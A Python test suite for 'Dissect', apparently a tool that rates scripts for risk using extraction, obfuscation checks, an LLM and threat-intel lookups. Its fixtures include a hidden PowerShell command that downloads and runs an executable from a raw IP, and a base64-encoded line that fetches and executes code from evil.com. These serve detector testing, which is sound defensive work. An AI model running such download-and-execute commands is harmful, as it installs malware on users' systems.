"""
Dissect — Full Test Suite (Phase 1 + Phase 2)

Tests core analysis, database layer, enrichment APIs, and caching.

Usage:
    1. Create .env file with at least GROQ_API_KEY
    2. Run: python test.py

Optional: Add VIRUSTOTAL_API_KEY, IPINFO_API_KEY to test enrichment APIs.
"""
import asyncio
import os
import sys
from dotenv import load_dotenv

load_dotenv()

from config import GROQ_API_KEY, VIRUSTOTAL_API_KEY, IPINFO_API_KEY
from ai.groq import GroqClient
from core.analyzer import analyze_script
from core.extractor import extract_all, detect_script_type, compute_script_hash
from core.obfuscation import detect_obfuscation
from bot.formatter import format_analysis
from db.models import Database
from db import queries
from enrichment.virustotal import VirusTotalClient
from enrichment.malwarebazaar import MalwareBazaarClient
from enrichment.ipinfo import IPInfoClient


# ─── Test Scripts ─────────────────────────────────────────────────────────────

BENIGN_SCRIPT = """
$UpdateSession = New-Object -ComObject Microsoft.Update.Session
$UpdateSearcher = $UpdateSession.CreateUpdateSearcher()
$SearchResult = $UpdateSearcher.Search("IsInstalled=0")
Write-Host "Updates available: $($SearchResult.Updates.Count)"
"""

MALICIOUS_SCRIPT = """
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
  $url = 'http://185.220.101.47/payload.exe';
  $path = $env:TEMP + '\\svchost32.exe';
  (New-Object System.Net.WebClient).DownloadFile($url, $path);
  Start-Process $path
"
"""

OBFUSCATED_SCRIPT = """
$encoded = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZCcpCg=='
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) | IEX
"""

AMBIGUOUS_SCRIPT = """
$url = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe"
$output = "$env:TEMP\\python_installer.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output -Args "/quiet InstallAllUsers=1" -Wait
"""


# ─── Helpers ──────────────────────────────────────────────────────────────────

def section(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def sub_section(title: str):
    print(f"\n--- {title} ---")


def ok(msg: str):
    print(f"  ✅ {msg}")


def warn(msg: str):
    print(f"  ⚠️  {msg}")


def fail(msg: str):
    print(f"  ❌ {msg}")


# ─── Phase 1 Tests ────────────────────────────────────────────────────────────

async def test_phase1_extraction():
    """Test static extraction and obfuscation detection."""
    section("Phase 1: Static Extraction & Obfuscation Detection")

    scripts = [
        ("Benign", BENIGN_SCRIPT),
        ("Malicious", MALICIOUS_SCRIPT),
        ("Obfuscated", OBFUSCATED_SCRIPT),
        ("Ambiguous", AMBIGUOUS_SCRIPT),
    ]

    for name, script in scripts:
        sub_section(name)

        extracted = extract_all(script)
        script_type = detect_script_type(script)
        obfuscation = detect_obfuscation(script)

        print(f"  Type: {script_type}")
        print(f"  URLs: {len(extracted['urls'])}, IPs: {len(extracted['ips'])}, Hashes: {len(extracted['hashes'])}")
        print(f"  Obfuscation: {'Yes' if obfuscation['obfuscation_detected'] else 'No'}")

        if obfuscation['flags']:
            for flag in obfuscation['flags'][:3]:
                print(f"    - {flag['name']}")

        ok("Extraction OK")


async def test_phase1_ai(scripts_results: dict, groq_client: GroqClient):
    """Test AI analysis on all 4 scripts."""
    section("Phase 1: AI Analysis")

    test_cases = [
        ("Benign", BENIGN_SCRIPT, ["LOW", "MEDIUM"]),
        ("Malicious", MALICIOUS_SCRIPT, ["HIGH", "CRITICAL"]),
        ("Obfuscated", OBFUSCATED_SCRIPT, ["HIGH", "CRITICAL"]),
        ("Ambiguous", AMBIGUOUS_SCRIPT, ["MEDIUM", "HIGH"]),
    ]

    for name, script, expected_risks in test_cases:
        sub_section(name)

        extracted = extract_all(script)
        script_type = detect_script_type(script)
        obfuscation = detect_obfuscation(script)
        obfuscation_flags = [flag["name"] for flag in obfuscation["flags"]]

        try:
            ai_analysis = await groq_client.analyze(
                script=script,
                enrichment={},
                obfuscation_flags=obfuscation_flags,
            )

            from core.analyzer import AnalysisResult
            result = AnalysisResult(
                script_hash=compute_script_hash(script),
                script_type=script_type,
                ai_analysis=ai_analysis,
                obfuscation=obfuscation,
                extracted=extracted,
            )

            scripts_results[name] = result

            risk = result.risk_level
            verdict = result.verdict[:60]
            confidence = result.ai_analysis.get("confidence", "N/A")

            print(f"  Risk Level: {risk}")
            print(f"  Confidence: {confidence}")
            print(f"  Verdict: {verdict}...")

            if risk in expected_risks:
                ok(f"Risk level '{risk}' is reasonable")
            else:
                warn(f"Risk level '{risk}' — expected one of {expected_risks}")

            # Print formatted message
            print(f"\n  Formatted message:")
            print(f"  {'-'*40}")
            for line in format_analysis(result).split("\n"):
                print(f"  {line}")
            print(f"  {'-'*40}")

        except Exception as e:
            fail(f"AI analysis failed: {e}")
            import traceback
            traceback.print_exc()


# ─── Phase 2 Tests ────────────────────────────────────────────────────────────

async def test_phase2_database():
    """Test database layer: caching, submissions, abuse detection."""
    section("Phase 2: Database Layer")

    # Clean up from previous runs
    if os.path.exists("test.db"):
        os.remove("test.db")

    db = Database("test.db")
    await db.connect()
    ok("Database connected (fresh)")

    # Test analysis cache
    sub_section("Analysis Cache")
    test_hash = compute_script_hash("test_script_123")
    test_result = {"risk_level": "HIGH", "verdict": "DO NOT RUN THIS", "script_type": "PowerShell"}

    await queries.set_analysis_cache(db, test_hash, test_result, ttl_hours=168)
    ok("Cache set")

    cached = await queries.get_analysis_cache(db, test_hash)
    assert cached == test_result, f"Cache mismatch: {cached}"
    ok("Cache get — data matches")

    # Test submission logging
    sub_section("Submission Logging")
    await queries.log_submission(db, "user_test", test_hash, "HIGH")
    count = await queries.count_submissions_per_hash_24h(db, test_hash)
    assert count == 1
    ok(f"Submission logged (hash count: {count})")

    # Test abuse detection
    sub_section("Abuse Detection")
    for i in range(11):
        await queries.log_submission(db, "user_test", test_hash, "HIGH")

    hash_count = await queries.count_submissions_per_hash_24h(db, test_hash)
    print(f"  Hash submissions in 24h: {hash_count}")

    from config import MAX_SUBMISSIONS_PER_HASH_PER_DAY
    if hash_count > MAX_SUBMISSIONS_PER_HASH_PER_DAY:
        ok(f"Abuse threshold exceeded ({hash_count} > {MAX_SUBMISSIONS_PER_HASH_PER_DAY})")
    else:
        warn("Abuse threshold not reached (expected for small test)")

    # Test enrichment cache
    sub_section("Enrichment Cache")
    await queries.set_enrichment_cache(db, "vt_test_key", {"malicious": 5, "total_engines": 70}, ttl_hours=24)
    cached_vt = await queries.get_enrichment_cache(db, "vt_test_key")
    assert cached_vt == {"malicious": 5, "total_engines": 70}
    ok("Enrichment cache set/get OK")

    # Cleanup
    await db.close()
    ok("Database closed")


async def test_phase2_enrichment():
    """Test enrichment APIs (if API keys are set)."""
    section("Phase 2: Enrichment APIs")

    db = Database("test.db")
    await db.connect()

    # VirusTotal
    sub_section("VirusTotal")
    if VIRUSTOTAL_API_KEY:
        vt_client = VirusTotalClient(api_key=VIRUSTOTAL_API_KEY, db=db)

        # Test URL lookup
        urls = ["http://google.com"]
        vt_urls = await vt_client.lookup_urls(urls)
        print(f"  URL lookups: {len(vt_urls)}")
        if vt_urls and vt_urls[0].get("virustotal"):
            vt_data = vt_urls[0]["virustotal"]
            if vt_data.get("status") == "not_found":
                ok("URL not in VT (expected for google.com)")
            elif vt_data.get("malicious") is not None:
                ok(f"VT returned: {vt_data['malicious']}/{vt_data['total_engines']} malicious")
            else:
                warn("VT returned empty data")

        # Test hash lookup
        hashes = ["e99a18c428cb38d5f260853678922e03abd5c28129e5c51f0c1c0e3e5e5e5e5e"]
        vt_hashes = await vt_client.lookup_hashes(hashes)
        print(f"  Hash lookups: {len(vt_hashes)}")
        ok("VirusTotal client OK")
    else:
        warn("VIRUSTOTAL_API_KEY not set — skipping")

    # MalwareBazaar
    sub_section("MalwareBazaar")
    mb_client = MalwareBazaarClient(db=db)
    # MB works without API key
    test_hash = "e99a18c428cb38d5f260853678922e03abd5c28129e5c51f0c1c0e3e5e5e5e5e"
    mb_results = await mb_client.lookup_hashes([test_hash])
    print(f"  Hash lookups: {len(mb_results)}")
    if mb_results:
        status = mb_results[0].get("malwarebazaar", {}).get("status", "unknown")
        print(f"  Status: {status}")
    ok("MalwareBazaar client OK")

    # IPInfo
    sub_section("IPInfo")
    if IPINFO_API_KEY:
        ip_client = IPInfoClient(api_key=IPINFO_API_KEY, db=db)
        ip_results = await ip_client.lookup_ips(["8.8.8.8"])
        print(f"  IP lookups: {len(ip_results)}")
        if ip_results:
            ipinfo = ip_results[0].get("ipinfo", {})
            print(f"  8.8.8.8 → {ipinfo.get('org', 'unknown')}, {ipinfo.get('country', 'unknown')}")
        ok("IPInfo client OK")
    else:
        warn("IPINFO_API_KEY not set — skipping")

    await db.close()


async def test_phase2_full_pipeline(scripts_results: dict, groq_client: GroqClient):
    """Test full analysis pipeline with DB + enrichment."""
    section("Phase 2: Full Pipeline (DB + Enrichment + Caching)")

    db = Database("test.db")
    await db.connect()

    enrichment_clients = {}
    if VIRUSTOTAL_API_KEY:
        enrichment_clients["virustotal"] = VirusTotalClient(api_key=VIRUSTOTAL_API_KEY, db=db)
    enrichment_clients["malwarebazaar"] = MalwareBazaarClient(db=db)
    if IPINFO_API_KEY:
        enrichment_clients["ipinfo"] = IPInfoClient(api_key=IPINFO_API_KEY, db=db)

    # Test 1: First analysis (cache miss)
    sub_section("Test 1: First Analysis (cache miss)")
    result1 = await analyze_script(
        MALICIOUS_SCRIPT,
        groq_client,
        user_id="test_user",
        db=db,
        enrichment_clients=enrichment_clients,
    )
    print(f"  Risk: {result1.risk_level}")
    print(f"  Cache hit: {result1.cache_hit}")
    assert not result1.cache_hit, "First analysis should be a cache miss"
    ok("Cache miss confirmed")

    # Test 2: Same script again (cache hit)
    sub_section("Test 2: Same Script (cache hit)")
    result2 = await analyze_script(
        MALICIOUS_SCRIPT,
        groq_client,
        user_id="test_user",
        db=db,
        enrichment_clients=enrichment_clients,
    )
    print(f"  Risk: {result2.risk_level}")
    print(f"  Cache hit: {result2.cache_hit}")
    assert result2.cache_hit, "Second analysis should be a cache hit"
    ok("Cache hit confirmed — no API calls needed")

    # Test 3: Different script (cache miss)
    sub_section("Test 3: Different Script (cache miss)")
    result3 = await analyze_script(
        BENIGN_SCRIPT,
        groq_client,
        user_id="test_user",
        db=db,
        enrichment_clients=enrichment_clients,
    )
    print(f"  Risk: {result3.risk_level}")
    print(f"  Cache hit: {result3.cache_hit}")
    assert not result3.cache_hit, "Different script should be a cache miss"
    ok("Cache miss confirmed for different script")

    # Print formatted messages
    sub_section("Formatted Messages")
    for name, result in [("Malicious (cached)", result2), ("Benign (fresh)", result3)]:
        print(f"\n  {name}:")
        print(f"  {'-'*40}")
        for line in format_analysis(result).split("\n"):
            print(f"  {line}")
        print(f"  {'-'*40}")

    await db.close()
    ok("Full pipeline tests passed")


# ─── Main ─────────────────────────────────────────────────────────────────────

async def main():
    print("\n" + "="*60)
    print("  DISSECT — FULL TEST SUITE (Phase 1 + Phase 2)")
    print("="*60)

    if not GROQ_API_KEY:
        print("\n❌ Error: GROQ_API_KEY not set in .env file")
        print("   Create a .env file with your Groq API key")
        print("   Get one at: https://console.groq.com/keys")
        return

    groq_client = GroqClient(GROQ_API_KEY)
    ok("Groq client initialized")

    scripts_results = {}

    # Phase 1
    await test_phase1_extraction()
    await test_phase1_ai(scripts_results, groq_client)

    # Phase 2
    await test_phase2_database()
    await test_phase2_enrichment()
    await test_phase2_full_pipeline(scripts_results, groq_client)

    # Summary
    section("SUMMARY")
    print(f"  Scripts tested: {len(scripts_results)}")
    for name, result in scripts_results.items():
        print(f"    {name}: {result.risk_level}")

    print("\n✅ All tests completed!\n")


if __name__ == "__main__":
    asyncio.run(main())
